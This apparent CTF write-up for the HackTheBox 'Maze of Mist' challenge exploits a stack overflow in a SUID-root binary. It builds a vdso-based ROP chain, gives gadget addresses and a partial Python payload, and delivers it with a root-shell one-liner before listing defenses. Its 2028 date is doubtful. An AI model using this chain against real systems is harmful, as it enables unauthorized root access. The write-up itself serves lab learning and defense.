---
layout: post
title: "Maze of Mist"
date: 2028-04-28 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, suid, ret2syscall, vdso, rop, aslr, buffer-overflow, cwe-121]
description: "A QEMU wrapper makes this look like a kernel challenge, but the real bug is a tiny SUID-root binary with no useful gadgets. With ASLR disabled, the fixed vdso becomes the ROP source and an or-al-from-memory trick loads syscall numbers with no pop-eax gadget."
---

## Overview

Maze of Mist is a Medium HackTheBox Pwn challenge. It ships as a QEMU/initramfs bundle that looks like a kernel exploit, but the real target is a userspace **SUID-root** binary with a [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html). The binary is so small it has no useful gadgets — so with ASLR disabled in the VM, the exploit pivots through the fixed **vdso** and synthesizes syscall numbers from bytes already in the binary.

## The technique

Extracting the initramfs, the `init` script gives the game away:

```
chmod 0400 /root/flag.txt
chmod u+s /target
echo 0 > /proc/sys/kernel/randomize_va_space
setsid cttyhack setuidgid 1000 /bin/sh
```

We run as uid 1000, the flag is root-only, `/target` is SUID root, and ASLR is off. So this is a userspace SUID privilege escalation, not a kernel bug.

`/target` is a hand-written-asm i386 static ELF (No PIE, No canary, No RELRO, NX). Its `_vuln` does `read(0, esp-0x20, 0x200)` then `ret` — 512 bytes into a 32-byte gap, so the saved return address sits at offset **32**.

The catch: the binary has **no `pop` gadgets at all**, only `int 0x80` sites. You can't set up registers for a syscall the usual way. But ASLR is off, so the vdso is at a fixed base (`0xf7ffc000`) and is full of gadgets. The key moves:

- A binary gadget `int 0x80; xor eax,eax; ret` is a reusable syscall primitive that leaves `eax = 0`.
- With eax=0, load a syscall number into `al` via the vdso gadget `or al, byte ptr [ebx+0x5e5b34c4]; ...`, pointing `ebx = target - 0x5e5b34c4` so the byte OR'd into al is one already present in the binary equal to the number you want (`0x17` setuid, bytes OR-ing to `0x0b` execve).
- vdso `pop edx; pop ecx; ret` + `mov dword ptr [edx], ecx` gives write-what-where to plant `/bin/sh` and argv in `.bss`; vdso `pop ebx; pop esi; pop ebp; ret` sets ebx.

Chain: `setuid(0)` — mandatory, since SUID gives euid 0 but ruid stays 1000 and `/bin/sh` would otherwise drop privileges — then `execve("/bin/sh", ["/bin/sh", NULL], NULL)`.

## Solution

`solve.py` builds the 420-byte ROP payload (under the 512-byte read). The initramfs has no `/tmp` and a cooked serial tty, so the cleanest delivery is to base64-decode the payload inline into a pipe and keep the resulting root shell's stdin open:

```bash
(echo -n <base64-payload> | base64 -d; cat) | /target
cat /root/flag.txt
```

The trailing `cat` forwards our keystrokes into the root shell. `id` returns `uid=0(root)` and the flag reads clean (`HTB{...}`, redacted).

The register-loading core of the payload:

```python
vdso = 0xf7ffc000
int80_xor_eax = 0x8049010                 # int 0x80 ; xor eax,eax ; ret  (eax=0 after each syscall)
or_al        = vdso + 0xccb               # or al,[ebx+0x5e5b34c4] ; pop edi ; pop ebp ; ret
pop_ebx      = vdso + 0x15cd              # pop ebx ; pop esi ; pop ebp ; ret

def set_al_from(addr):                    # al |= byte at addr -> pick a byte == wanted syscall no.
    return p32(pop_ebx) + p32((addr - 0x5e5b34c4) & 0xffffffff) + p32(0)*2 + p32(or_al) + p32(0)*2

payload  = b'A'*32
payload += set_al_from(0x804a08c)         # al = 0x17 (setuid)
payload += p32(pop_ebx) + p32(0)*3        # ebx = 0
payload += p32(int80_xor_eax)             # setuid(0)
# ... then build eax=0x0b, write /bin/sh + argv to .bss, set ebx/ecx/edx, int 0x80 -> execve
```

## Why it worked

Two things line up: a SUID-root binary with an unbounded `read` overflow, and a disabled-ASLR environment that turns the gadget-rich vdso into a fixed ROP source. The `or al,[mem]` trick manufactures syscall numbers from bytes the binary already contains, so a `pop eax` gadget is never required.

## Fix / defense

- Never leave a stack-overflowable binary SUID root; bound reads and compile with `-fstack-protector`.
- Keep ASLR enabled (`randomize_va_space=2`) so the vdso base and `.bss` staging address are unpredictable.
- Drop privileges early (`setresuid` to the real uid) in any SUID helper before touching untrusted input.
